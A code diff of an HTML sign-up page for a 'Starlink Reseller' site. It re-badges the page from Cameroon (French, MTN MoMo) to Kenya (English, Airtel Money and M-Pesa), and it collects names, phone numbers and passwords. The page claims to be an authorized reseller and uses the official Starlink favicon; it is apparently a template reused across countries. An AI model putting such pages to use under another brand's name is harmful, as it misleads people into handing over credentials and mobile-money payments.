@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="page-title">Inscription - Starlink</title>
+    <title id="page-title">Sign Up - Starlink Kenya</title>
     <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
     <link rel="manifest" href="/starlink/manifest.json">
     <meta name="theme-color" content="#000000">
@@ -79,22 +79,22 @@
     <!-- Main -->
     <main class="min-h-screen flex items-center justify-center px-4 py-12">
         <div class="bg-white rounded-2xl card-shadow p-8 w-full max-w-md">
-            <h1 id="form-title" class="text-2xl font-black text-gray-900 text-center mb-1">Inscription</h1>
-            <p id="form-subtitle" class="text-gray-500 text-sm text-center mb-8">Créez votre compte Starlink</p>
+            <h1 id="form-title" class="text-2xl font-black text-gray-900 text-center mb-1">Sign Up</h1>
+            <p id="form-subtitle" class="text-gray-500 text-sm text-center mb-8">Create your Starlink Kenya account</p>
 
             <div id="errorMsg" class="error-msg"></div>
 
             <form id="registerForm" onsubmit="handleRegister(event)" novalidate>
                 <div class="mb-4">
-                    <label id="lbl-name" class="block text-sm font-semibold text-gray-700 mb-2">Prénom</label>
-                    <input type="text" id="fullName" class="input-field" id="lbl-name-input" placeholder="Votre prénom" autocomplete="given-name" required>
+                    <label id="lbl-name" class="block text-sm font-semibold text-gray-700 mb-2">First name</label>
+                    <input type="text" id="fullName" class="input-field" id="lbl-name-input" placeholder="Your first name" autocomplete="given-name" required>
                 </div>
                 <div class="mb-4">
-                    <label id="lbl-phone" class="block text-sm font-semibold text-gray-700 mb-2">Numéro de téléphone</label>
+                    <label id="lbl-phone" class="block text-sm font-semibold text-gray-700 mb-2">Phone number</label>
                     <input type="tel" id="phone" class="input-field" placeholder="+254 712 345678" autocomplete="tel" required>
                 </div>
                 <div class="mb-4">
-                    <label id="lbl-password" class="block text-sm font-semibold text-gray-700 mb-2">Mot de passe</label>
+                    <label id="lbl-password" class="block text-sm font-semibold text-gray-700 mb-2">Password</label>
                     <div class="relative">
                         <input type="password" id="password" class="input-field input-pwd" placeholder="••••••••" autocomplete="new-password" required>
                         <button type="button" onclick="togglePwd('password', this)" title="Toggle password visibility" class="absolute right-3 text-gray-400 hover:text-gray-600" style="background:none;border:none;cursor:pointer;padding:4px;top:50%;transform:translateY(-50%)">
@@ -103,7 +103,7 @@
                     </div>
                 </div>
                 <div class="mb-5">
-                    <label id="lbl-confirm" class="block text-sm font-semibold text-gray-700 mb-2">Confirmer le mot de passe</label>
+                    <label id="lbl-confirm" class="block text-sm font-semibold text-gray-700 mb-2">Confirm password</label>
                     <div class="relative">
                         <input type="password" id="confirmPassword" class="input-field input-pwd" placeholder="••••••••" autocomplete="new-password" required>
                         <button type="button" onclick="togglePwd('confirmPassword', this)" title="Toggle password visibility" class="absolute right-3 text-gray-400 hover:text-gray-600" style="background:none;border:none;cursor:pointer;padding:4px;top:50%;transform:translateY(-50%)">
@@ -115,18 +115,18 @@
                 <div class="flex items-start gap-3 mb-6">
                     <input type="checkbox" id="terms" class="mt-1 flex-shrink-0 w-4 h-4 accent-blue-600" required>
                     <label for="terms" id="terms-label" class="text-sm text-gray-600">
-                        J'accepte les <a href="#" class="text-blue-600 font-semibold hover:underline" id="terms-link">conditions d'utilisation</a>
+                        I accept the <a href="#" class="text-blue-600 font-semibold hover:underline" id="terms-link">terms of use</a>
                     </label>
                 </div>
 
                 <button type="submit" id="submitBtn" class="btn-primary">
-                    <span id="btn-text">S'inscrire</span>
+                    <span id="btn-text">Sign Up</span>
                 </button>
             </form>
 
             <p class="text-center text-sm text-gray-500 mt-6">
-                <span id="have-account-text">Vous avez déjà un compte ?</span>
-                <a href="/starlink/login.html" id="login-link" class="text-blue-600 font-semibold hover:underline ml-1">Se connecter</a>
+                <span id="have-account-text">Already have an account?</span>
+                <a href="/starlink/login.html" id="login-link" class="text-blue-600 font-semibold hover:underline ml-1">Log in</a>
             </p>
         </div>
     </main>
@@ -145,7 +145,7 @@
                     <p class="text-sm" id="footer-support">Available 24/7 for technical support.</p>
                 </div>
                 <div>
-                    <h3 class="text-white font-bold mb-3" id="footer-payment-title">PAIEMENT</h3>
+                    <h3 class="text-white font-bold mb-3" id="footer-payment-title">PAYMENT</h3>
                     <p class="text-sm" id="footer-payment-desc">Pay securely with Airtel Money or Safaricom M-Pesa. Make sure you have sufficient balance.</p>
                 </div>
             </div>
@@ -180,20 +180,20 @@
                 footerPaymentTitle: 'PAIEMENT', footerPaymentDesc: "Payez en toute sécurité avec MTN MoMo. Assurez-vous d'avoir un solde suffisant.",
                 footerCopyright: '\u00a9 2026 Starlink Reseller Cameroun. Tous droits réservés.'
             },
-            en: {
-                pageTitle: 'Sign Up - Starlink', headerSubtitle: 'Reseller',
+en: {
+                pageTitle: 'Sign Up - Starlink Kenya', headerSubtitle: 'Reseller Kenya',
                 navStatus: 'Status', navPlans: 'Packages', navLogin: 'Login',
-                formTitle: 'Sign Up', formSubtitle: 'Create your Starlink account',
+                formTitle: 'Sign Up', formSubtitle: 'Create your Starlink Kenya account',
                 lblName: 'First name', lblPhone: 'Phone number', lblPassword: 'Password',
                 lblConfirm: 'Confirm password', termsLabel: 'I accept the', termsLink: 'terms of use',
                 btnText: 'Sign Up', haveAccount: 'Already have an account?', loginLink: 'Log in',
                 errEmpty: 'Please fill in all fields.', errPwdMatch: 'Passwords do not match.',
                 errPwdLen: 'Password must be at least 6 characters.', errTerms: 'Please accept the terms of use.',
                 errPhone: 'Phone number already registered.', errServer: 'Server error. Please try again.',
-                footerDesc: 'Authorized Starlink reseller. Fast, reliable and secure payments via MTN MoMo.',
+                footerDesc: 'Authorized Starlink reseller. Fast, reliable and secure payments via Airtel Money and Safaricom M-Pesa.',
                 footerSupport: 'Available 24/7 for technical support.',
-                footerPaymentTitle: 'PAYMENT', footerPaymentDesc: 'Pay securely with MTN MoMo. Make sure you have sufficient balance.',
-                footerCopyright: '\u00a9 2026 Starlink Reseller Cameroon. All rights reserved.'
+                footerPaymentTitle: 'PAYMENT', footerPaymentDesc: 'Pay securely with Airtel Money or Safaricom M-Pesa. Make sure you have sufficient balance.',
+                footerCopyright: '© 2026 Starlink Reseller Kenya. All rights reserved.'
             },
             my: {
                 pageTitle: 'မှတ်ပုံတင်မည် - Starlink', headerSubtitle: 'ပြန်လည်ရောင်းချသူ',
